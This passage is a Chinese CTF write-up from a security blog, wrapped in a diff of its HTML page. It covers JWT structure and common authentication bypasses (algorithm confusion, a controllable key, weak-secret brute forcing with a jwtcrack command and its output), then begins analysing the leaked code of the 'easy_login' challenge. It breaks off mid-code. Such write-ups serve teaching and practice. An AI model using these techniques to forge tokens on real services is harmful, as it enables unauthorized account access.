@@ -1,0 +1,1181 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="探索Node.js中JWT认证缺陷的绕过, Qftm">
+    <meta name="description" content="Maybe a hacker">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>探索Node.js中JWT认证缺陷的绕过 | Qftm</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Qftm</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Qftm</div>
+        <div class="logo-desc">
+            
+            Maybe a hacker
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-heartbeat"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/bg.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">探索Node.js中JWT认证缺陷的绕过</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/JWT/">
+                                <span class="chip bg-color">JWT</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                Web安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2020-04-19
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-03-15
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    3.4k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    13 Min
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打比赛遇见一道Web题很有意思，考察的是Node.js中JWT认证问题，由于和自己以前所遇到的JWT认证绕过都不太一样，所以打算记录分析一下这个探索过程。</p>
+<p>在开始描述探索过程之前不妨先来了解一下什么是<code>Node.js</code>、<code>JWT</code></p>
+<h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><blockquote>
+<p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。 Node.js 使用了一个事件驱动、非阻塞式 I/O 的模型。<br>Node 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。发布于2009年5月，由Ryan Dahl开发，实质是对Chrome V8引擎进行了封装。<br>Node对一些特殊用例进行优化，提供替代的API，使得V8在非浏览器环境下运行得更好。V8引擎执行Javascript的速度非常快，性能非常好。Node是一个基于Chrome JavaScript运行时建立的平台， 用于方便地搭建响应速度快、易于扩展的网络应用。Node 使用事件驱动， 非阻塞I/O 模型而得以轻量和高效，非常适合在分布式设备上运行数据密集型的实时应用。</p>
+</blockquote>
+<h1 id="Json-Web-Token"><a href="#Json-Web-Token" class="headerlink" title="Json Web Token"></a>Json Web Token</h1><p>Json Web Token 简称JWT，用做用户身份验证。那么其结构长什么样呢，下面通过一个例子去分析</p>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiUWZ0bSJ9.TuRVnrUI9ouQRElTfKF8pK-bZz-Z5umNew9m4YJDpSg</code></pre><p>上面是一串JWT格式的字符串，在线解密查看内容：<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>
+<p><img src="/2020/04/19/bypass-nodejs-jwt/image-20200419175403229.png" alt="image-20200419175403229"></p>
+<p>从解密的结果可以看到其由三部分组成（头部、载荷、签名）</p>
+<pre><code>Header
+Payload
+Signature</code></pre><p>为什么说它的(JWT)名字里面带有Json不难看出，因为其解密出来的内容是按照Json格式存储的，下面通过上述的一个JWT例子对其三部分简单介绍一下</p>
+<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>Header通常由两部分组成：令牌的类型，即JWT和正在使用的散列算法，如HMAC SHA256或RSA。</p>
+<ul>
+<li>明文</li>
+</ul>
+<pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span><span class="token punctuation">,</span>
+  <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>不难看出typ为类型的缩写，alg为算法的缩写。然后，这个JSON被Base64编码，形成JSON Web Token的第一部分。</p>
+<ul>
+<li>密文</li>
+</ul>
+<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code></pre><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>令牌的第二部分是包含声明的有效负载。声明是关于实体（通常是用户）和其他元数据的声明。</p>
+<ul>
+<li>明文</li>
+</ul>
+<pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"secretid"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
+  <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
+  <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"Qftm"</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>同样对其base64编码得到第二部分</p>
+<ul>
+<li>密文</li>
+</ul>
+<pre><code>eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiUWZ0bSJ9</code></pre><h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><p>这部分为创建签名部分，必须采用header，payload，密钥三部分处理，利用header中指定算法进行签名。</p>
+<p>例如HS256(HMAC SHA256)，签名的构成为：</p>
+<pre><code>HMACSHA256(
+  base64Encode(header) + &quot;.&quot; +
+  base64Encode(payload),
+  secret)     #例子中所述的密钥为：123</code></pre><p>然后将这部分同样base64编码形成JWT第三部分。</p>
+<p>了解了Json Web Token的组成，下面理解其攻击手法就比较容易了。</p>
+<h1 id="Node-js-JWT-Attack"><a href="#Node-js-JWT-Attack" class="headerlink" title="Node.js JWT Attack"></a>Node.js JWT Attack</h1><p>在了解Node.js中的JWT问题之前，有必要了解一下一般常见的JWT认证绕过手法。</p>
+<h2 id="常见攻击手法"><a href="#常见攻击手法" class="headerlink" title="常见攻击手法"></a>常见攻击手法</h2><p>一般情况下针对JWT认证的绕过主要有三种情况，都是针对密钥并结合签名算法进行合理利用的。</p>
+<h3 id="第一种：算法修改"><a href="#第一种：算法修改" class="headerlink" title="第一种：算法修改"></a>第一种：算法修改</h3><p>这种手法主要是转换签名算法：非对称签名算法—-&gt;对称签名算法。</p>
+<p>例如：网站信息泄露，泄露了公钥publickey，然而网站采用的RSA的签名算法，这种情况下其使用私钥进行签名，公钥进行解密验证。</p>
+<p>此时你会发现公钥好像没什么用，是否真的没用呢？答案是否定的，我们可以将其签名算法进行更改，讲原本的对称算法改为非对称算法然后伪造相应的JWT进行绕过，因为我们采用对称算法然后利用泄露的公钥进行签名，服务端会相应的利用其公钥正常解密，这是由于对称算法的密钥一致性（加密和解密使用的是同一个密钥）。</p>
+<h3 id="第二种：密钥可控"><a href="#第二种：密钥可控" class="headerlink" title="第二种：密钥可控"></a>第二种：密钥可控</h3><p>这种情况下主要是由于网站的漏洞我们可以控制其密钥的产生。</p>
+<p>例如：网站的密钥由一个ID进行查询获得</p>
+<p>针对这种情况可以尝试注入改变其ID的查询结果，使密钥为我们自己构造的，这样即可绕过其认证限制。</p>
+<h3 id="第三种：密钥爆破"><a href="#第三种：密钥爆破" class="headerlink" title="第三种：密钥爆破"></a>第三种：密钥爆破</h3><p>这种情况下主要是利用了弱密钥的因素，然后进行密钥爆破。</p>
+<p>例如：网站采用的是弱密钥进行签名，如上面所述的例子密钥为<code>123</code></p>
+<p>使用工具爆破：<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a></p>
+<pre><code>root@rose:~/c-jwt-cracker-master# ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiUWZ0bSJ9.TuRVnrUI9ouQRElTfKF8pK-bZz-Z5umNew9m4YJDpSg
+Secret is &quot;123&quot;
+root@rose:~/c-jwt-cracker-master#</code></pre><p>下面所述的<code>Node JWT 攻击手法</code>和上面所常见的手法并不一样</p>
+<h2 id="Node-JWT-攻击手法"><a href="#Node-JWT-攻击手法" class="headerlink" title="Node JWT 攻击手法"></a>Node JWT 攻击手法</h2><p>这里通过一个题目案例，真实的对Node.js中JWT认证绕过进行攻击的手法研究，攻击目的为绕过登录限制，使用管理员权限进行操作Get Flag。</p>
+<p><strong>主要考察点如下：</strong></p>
+<ul>
+<li><p>Node.js 代码审计</p>
+</li>
+<li><p>Node.js 依赖库缺陷</p>
+</li>
+<li><p>Node.js 弱类型特性</p>
+</li>
+</ul>
+<h3 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h3><p>题目信息如下：</p>
+<pre><code>题目名称：easy_login
+
+题目描述：最近正在开始学习nodejs开发，不如先写个登陆界面练练手。什么，大佬说我的程序有bug？我写的代码逻辑完美顺利运行怎么可能出错？！错的一定是我的依赖库！！</code></pre><h3 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h3><p>首先题目链接打开后是个登录界面</p>
+<p><img src="/2020/04/19/bypass-nodejs-jwt/image-20200419130804080.png" alt="image-20200419130804080"></p>
+<p>依据题目描述可知，其网站采用的是Node编写，由于node应用默认存在package.json，所以尝试访问查看是否存在一些重要信息，可以看到采用了<code>jsonwebtoken</code>、<code>koa-jwt</code>等验证组件</p>
+<pre><code>http://xxxxx/package.json
+
+{
+  &quot;name&quot;: &quot;login&quot;,
+  &quot;version&quot;: &quot;1.0.0&quot;,
+  &quot;description&quot;: &quot;&quot;,
+  &quot;main&quot;: &quot;app.js&quot;,
+  &quot;scripts&quot;: {
+    &quot;test&quot;: &quot;npm start&quot;
+  },
+  &quot;dependencies&quot;: {
+    &quot;jsonwebtoken&quot;: &quot;^8.5.1&quot;,
+    &quot;koa&quot;: &quot;^2.11.0&quot;,
+    &quot;koa-bodyparser&quot;: &quot;^4.2.1&quot;,
+    &quot;koa-jwt&quot;: &quot;^3.6.0&quot;,
+    &quot;koa-router&quot;: &quot;^7.4.0&quot;,
+    &quot;koa-session&quot;: &quot;^5.12.3&quot;,
+    &quot;koa-static&quot;: &quot;^5.0.0&quot;,
+    &quot;koa-views&quot;: &quot;^6.2.1&quot;,
+    &quot;pug&quot;: &quot;^2.0.4&quot;
+  }
+}</code></pre><p>先不管其它，尝试注册普通用户<code>1:1</code>登录查看</p>
+<p><img src="/2020/04/19/bypass-nodejs-jwt/image-20200419130959771.png" alt="image-20200419130959771"></p>
+<p>进去之后显示权限不够，继续观察，抓包分析</p>
+<p><img src="/2020/04/19/bypass-nodejs-jwt/image-20200419132133431.png" alt="image-20200419132133431"></p>
+<p>根据抓包信息可以看到采用了JWT验证用户信息：<a href="https://jwt.io/" target="_blank" rel="noopener">JWT解密</a></p>
+<p><img src="/2020/04/19/bypass-nodejs-jwt/image-20200419132143332.png" alt="image-20200419132143332"></p>
+<p>观察网站源码，在<code>app.js</code>中可以查看登录验证，可以看到登录相关的主要存在这三个变量中<code>username, password, authorization</code>。当登录成功时就会跳转到/home目录下失败则会返回<code>Cannot read property &#39;split&#39; of undefined</code></p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">/**
+ *  或许该用 koa-static 来处理静态文件
+ *  路径该怎么配置？不管了先填个根目录XD
+ */</span>
+
+<span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> password <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> token <span class="token operator">=</span> sessionStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/login"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> authorization<span class="token punctuation">:</span>token<span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">const</span> <span class="token punctuation">{</span>status<span class="token punctuation">}</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/home"</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>xhr<span class="token punctuation">,</span> textStatus<span class="token punctuation">,</span> errorThrown<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token function">alert</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseJSON<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> password <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/register"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> password<span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">const</span> <span class="token punctuation">{</span> token <span class="token punctuation">}</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>
+            sessionStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/login"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token punctuation">.</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>xhr<span class="token punctuation">,</span> textStatus<span class="token punctuation">,</span> errorThrown<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token function">alert</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseJSON<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    $<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/api/logout'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">const</span> <span class="token punctuation">{</span>status<span class="token punctuation">}</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'/login'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    $<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/api/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">const</span> <span class="token punctuation">{</span>flag<span class="token punctuation">}</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>xhr<span class="token punctuation">,</span> textStatus<span class="token punctuation">,</span> errorThrown<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">alert</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseJSON<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>第一想法是尝试寻找是否泄露了密钥或者爆破密钥，但是最终都无果，于是又回到题目描述，那就只有某些组件存在可能绕过漏洞。</p>
+<h3 id="深入测试"><a href="#深入测试" class="headerlink" title="深入测试"></a>深入测试</h3><p>由于上面的 app.js 里有写到 static 是直接映射到程序根目录的，猜测程序可能存在任意文件读取漏洞。继续对网站进行探测，在<code>controllers</code>接口中发现<code>api.js</code>泄露，里面存在具体的登录注册等逻辑代码，也就是放在服务端的代码。</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">const</span> APIError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../rest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>APIError<span class="token punctuation">;</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token string">'POST /api/register'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+        <span class="token keyword">const</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> password<span class="token punctuation">}</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'register error'</span><span class="token punctuation">,</span> <span class="token string">'wrong username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">100000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
